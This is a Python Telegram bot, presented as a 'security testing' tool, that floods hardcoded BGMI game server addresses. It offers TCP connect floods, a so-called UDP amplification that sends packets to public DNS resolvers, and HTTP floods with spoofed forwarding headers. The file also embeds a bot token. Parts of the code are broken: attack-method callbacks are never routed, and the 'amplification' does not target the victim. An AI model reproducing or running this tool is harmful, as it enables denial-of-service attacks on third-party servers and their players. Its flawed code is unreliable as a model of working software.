#!/usr/bin/env python3
import os, sys, json, asyncio, aiohttp, socket, random, time, threading, requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

TOKEN = "7495818192:AAFKYCb5ipxKWcxYawROvVmLgxmzkrW7Kkc"

BGMI_SERVERS = {
    "Asia": [{"ip": "103.10.25.1", "port": 443}, {"ip": "103.10.25.2", "port": 443}],
    "China": [{"ip": "119.147.85.1", "port": 443}, {"ip": "119.147.85.2", "port": 443}],
    "Europe": [{"ip": "162.159.135.1", "port": 443}, {"ip": "162.159.135.2", "port": 443}],
}

attack_status = {"running": False, "target": "", "method": "", "start_time": None, "packets_sent": 0, "threads": []}

class AttackMethods:
    @staticmethod
    def tcp_syn_flood(target_ip, target_port, duration):
        end_time = time.time() + duration
        packets = 0
        while time.time() < end_time and attack_status["running"]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect_ex((target_ip, target_port))
                sock.send(b"\x00" * 1024)
                sock.close()
                packets += 1
            except: pass
        return packets
    
    @staticmethod
    def udp_amplification(target_ip, target_port, duration):
        end_time = time.time() + duration
        packets = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]
        while time.time() < end_time and attack_status["running"]:
            try:
                for dns in dns_servers:
                    sock.sendto(b"\x00" * 512, (dns, 53))
                    packets += 1
            except: pass
        sock.close()
        return packets
    
    @staticmethod
    def http_flood(target_url, duration):
        end_time = time.time() + duration
        packets = 0
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Dalvik/2.1.0 (Linux; U; Android 11; SM-G998B)",
            "BGMI/1.5.0 (Android 11; Samsung Galaxy S21)"
        ]
        while time.time() < end_time and attack_status["running"]:
            try:
                headers = {"User-Agent": random.choice(agents), "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"}
                requests.get(target_url, headers=headers, timeout=0.5)
                packets += 1
            except: pass
        return packets

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🎯 BGMI Asia", callback_data="bgmi_asia")],
        [InlineKeyboardButton("🎯 BGMI China", callback_data="bgmi_china")],
        [InlineKeyboardButton("🎯 BGMI Europe", callback_data="bgmi_europe")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
        [InlineKeyboardButton("🛑 Stop", callback_data="stop")]
    ]
    await update.message.reply_text(
        "🚀 **BGMI Security Testing Bot**\n\n"
        "⚠️ Authorized pentest only\n"
        "**Choose server:**",
        reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "status":
        if attack_status["running"]:
            elapsed = int(time.time() - attack_status["start_time"])
            await query.edit_message_text(f"📊 **Status:** Running\n🎯 Target: {attack_status['target']}\n⏱ Time: {elapsed}s\n📦 Packets: {attack_status['packets_sent']}")
        else:
            await query.edit_message_text("📊 No active attack")
        return
    
    if query.data == "stop":
        attack_status["running"] = False
        await query.edit_message_text("🛑 Stopped!")
        return
    
    # Region select
    region = query.data.replace("bgmi_", "").capitalize()
    keyboard = [
        [InlineKeyboardButton("🔴 TCP SYN", callback_data=f"method_tcp_{region}")],
        [InlineKeyboardButton("🔵 UDP Amp", callback_data=f"method_udp_{region}")],
        [InlineKeyboardButton("🟢 HTTP", callback_data=f"method_http_{region}")],
    ]
    await query.edit_message_text(f"🌍 **{region}** - Select method:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def start_attack(query, region, method):
    if attack_status["running"]:
        await query.edit_message_text("❌ Attack already running! Use /stop")
        return
    
    servers = BGMI_SERVERS[region]
    duration = 30
    
    await query.edit_message_text(f"⚔️ **Attacking {region}**\nMethod: {method.upper()}\nDuration: {duration}s")
    
    attack_status["running"] = True
    attack_status["method"] = method
    attack_status["start_time"] = time.time()
    attack_status["packets_sent"] = 0
    
    for server in servers:
        attack_status["target"] = f"{server['ip']}:{server['port']}"
        if method == "tcp":
            t = threading.Thread(target=lambda: attack_status.__setitem__("packets_sent", attack_status["packets_sent"] + AttackMethods.tcp_syn_flood(server['ip'], server['port'], duration)))
        elif method == "udp":
            t = threading.Thread(target=lambda: attack_status.__setitem__("packets_sent", attack_status["packets_sent"] + AttackMethods.udp_amplification(server['ip'], server['port'], duration)))
        elif method == "http":
            t = threading.Thread(target=lambda: attack_status.__setitem__("packets_sent", attack_status["packets_sent"] + AttackMethods.http_flood(f"https://{server['ip']}:{server['port']}", duration)))
        t.start()
        attack_status["threads"].append(t)
    
    for t in attack_status["threads"]:
        t.join()
    
    attack_status["running"] = False
    await query.edit_message_text(f"✅ **Done!**\nPackets sent: {attack_status['packets_sent']:,}")

def main():
    if TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Set your BOT_TOKEN in bot.py!")
        sys.exit(1)
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
